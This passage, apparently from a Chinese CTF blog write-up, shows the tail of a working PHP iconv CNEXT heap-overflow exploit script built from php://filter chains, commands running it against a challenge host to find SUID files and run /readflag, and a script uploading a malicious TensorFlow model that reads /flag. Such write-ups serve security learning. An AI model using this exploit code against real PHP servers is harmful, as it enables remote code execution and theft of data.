</span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 0: Setup heap  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 1: Reverse FL order  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 2: Put fake pointer and make FL order back to normal  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 3: Trigger overflow  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap  </span></span><br><span class="line">            <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">        ]  </span><br><span class="line">        filters = <span class="string">&quot;|&quot;</span>.join(filters)  </span><br><span class="line">        path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> path  </span><br><span class="line">  </span><br><span class="line"><span class="meta">    @inform(<span class="params"><span class="string">&quot;Triggering...&quot;</span></span>)  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        path = self.build_exploit_path()  </span><br><span class="line">        start = time.time()  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            self.remote.send(path)  </span><br><span class="line">        <span class="keyword">except</span> (ConnectionError, ChunkedEncodingError):  </span><br><span class="line">            <span class="keyword">pass</span>  </span><br><span class="line">  </span><br><span class="line">        msg_print()  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.sleep:  </span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)  </span><br><span class="line">        <span class="keyword">elif</span> start + self.sleep &lt;= time.time():  </span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!  </span></span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_print()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="comment"># Remove 2-byte header and 4-byte checksum  </span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    payload = base64.encode(data)  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):  </span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> payload.encode()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size  </span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))  </span><br><span class="line">    bucket = qpe(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = compressed_bucket(bucket)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> bucket  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the  </span></span><br><span class="line"><span class="string">    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    &quot;&quot;&quot;</span>    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than  </span></span><br><span class="line">    <span class="comment"># enough    if size is None:  </span></span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span>  </span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)  </span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@dataclass  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    start: <span class="built_in">int</span>  </span><br><span class="line">    stop: <span class="built_in">int</span>  </span><br><span class="line">    permissions: <span class="built_in">str</span>  </span><br><span class="line">    path: <span class="built_in">str</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">    @property  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:  </span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">Exploit()</span><br></pre></td></tr></table></figure>
<p>由于权限不足, 不能直接读flag, 且不出网, 无写权限,</p>
<p>直接看一下suid, 把输出写到&#x2F;tmp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py &quot;https://eci-2zefy6ftjjeuuqjqwyee.cloudeci1.ichunqiu.com:80/&quot; &quot; find / -user root -perm -4000 -print 2&gt;/dev/null &gt;/tmp/a&quot;</span><br></pre></td></tr></table></figure>

<p>可以看见&#x2F;readflag有suid</p>
<p><img src="https://gagjcxhxrb.feishu.cn/space/api/box/stream/download/asynccode/?code=OTAwY2FjMDM1OGU1ZWU2YTIyNDBmNmM3MWM5MjczMDZfalkxUFgwSUNsdkphQlZCYTl0aXo0OVo2OEJ6SERCWWNfVG9rZW46Tk5HS2JBd3ZBb3JuVEt4TUpnRWNiaHFSbnFiXzE3NTc5MjcxOTc6MTc1NzkzMDc5N19WNA"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit33.py &quot;https://eci-2zefy6ftjjeuuqjqwyee.cloudeci1.ichunqiu.com:80/&quot; &quot;/readflag &gt;/tmp/a&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gagjcxhxrb.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRhOTMxMjc1ZDg3NDZjM2QyNjEwYWY5NWE0MWEzMWRfYm51Z1paeG9zMXF6SFFrbVoyNWNDb3VoTGVOR0JDQ1RfVG9rZW46U1pWY2JZajF6b3FVTXh4clZJRmNaQUZhbnZlXzE3NTc5MjcxOTc6MTc1NzkzMDc5N19WNA"></p>
<h2 id="Mini-modelscope"><a href="#Mini-modelscope" class="headerlink" title="Mini-modelscope"></a>Mini-modelscope</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaliciousModule</span>(tf.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment"># __init__ 不执行任何文件 I/O</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @tf.function(<span class="params">input_signature=[tf.TensorSpec(<span class="params">shape=[<span class="number">1</span>,<span class="number">1</span>], dtype=tf.float32</span>)]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># 使用 TensorFlow 原生文件读取</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = tf.io.read_file(<span class="string">&quot;/flag&quot;</span>)  <span class="comment"># 返回 tf.string</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag = tf.constant(<span class="string">&quot;FLAG_NOT_FOUND&quot;</span>)</span><br><span class="line">        <span class="comment"># 返回 shape=(1,) 的 tensor</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;prediction&quot;</span>: tf.reshape(flag, [<span class="number">1</span>])&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 保存模型 ====</span></span><br><span class="line">model = MaliciousModule()</span><br><span class="line">tf.saved_model.save(model, <span class="string">&quot;malicious_model&quot;</span>, signatures=&#123;<span class="string">&#x27;serve&#x27;</span>: model.serve&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 打包为 ZIP ====</span></span><br><span class="line">shutil.make_archive(<span class="string">&quot;model&quot;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&quot;malicious_model&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated model.zip&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 上传到靶机 ====</span></span><br><span class="line">url = <span class="string">&quot;https://eci-2ze3h3ldcbzfy3zyrndw.cloudeci1.ichunqiu.com:5000/upload&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;model.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    files = &#123;<span class="string">&#x27;model_file&#x27;</span>: (<span class="string">&quot;model.zip&quot;</span>, f, <span class="string">&#x27;application/zip&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(url, files=files, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Upload response:&quot;</span>, r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">n4c1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/">http://example.com/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">n4c1's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/09/22/WMCTF-2025-CTF-WEB-WP/" title="WMCTF 2025 CTF WEB WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">WMCTF 2025 CTF WEB WP</div></div></a></div><div class="next-post pull-right"><a href="/2025/09/15/sekaictf-2025-hqli-me/" title="sekaictf 2025 hqli-me"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sekaictf 2025 hqli-me</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">n4c1</div><div class="author-info__description">hello,world</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E6%9B%B2%E7%AD%BE%E5%AD%A6"><span class="toc-number">1.</span> <span class="toc-text">文曲签学</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-upload"><span class="toc-number">2.</span> <span class="toc-text">EZ_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeRce"><span class="toc-number">3.</span> <span class="toc-text">SeRce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mini-modelscope"><span class="toc-number">4.</span> <span class="toc-text">Mini-modelscope</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/20/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-WEB-WP-%E9%A2%98%E8%A7%A3/" title="2025 强网杯S9 WEB WP 题解">2025 强网杯S9 WEB WP 题解</a><time datetime="2025-10-20T13:31:37.000Z" title="发表于 2025-10-20 21:31:37">2025-10-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/13/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WEB-WP-%E5%90%AB-%E9%87%91Java/" title="2025 羊城杯 WEB WP 题解 (含 金Java)">2025 羊城杯 WEB WP 题解 (含 金Java)</a><time datetime="2025-10-13T14:11:33.000Z" title="发表于 2025-10-13 22:11:33">2025-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/02/2025%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-WEB-JDBCParty/" title="2025软件系统安全赛 WEB JDBCParty">2025软件系统安全赛 WEB JDBCParty</a><time datetime="2025-10-02T13:11:33.000Z" title="发表于 2025-10-02 21:11:33">2025-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/02/CVE-2022-39197-CS-RCE/" title="CVE-2022-39197 CS RCE">CVE-2022-39197 CS RCE</a><time datetime="2025-10-02T13:10:39.000Z" title="发表于 2025-10-02 21:10:39">2025-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/26/L3CTF-2025-WEB-%E5%A4%8D%E7%8E%B0/" title="L3CTF 2025 WEB 复现">L3CTF 2025 WEB 复现</a><time datetime="2025-09-25T16:06:05.000Z" title="发表于 2025-09-26 00:06:05">2025-09-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By n4c1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="Java,Python,PHP,Node,Golang,C#,Tomcat,Apache,SqlInjection,SSTI,LFI,XSS,Nmap,BurpSuite,Hack,Docker" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>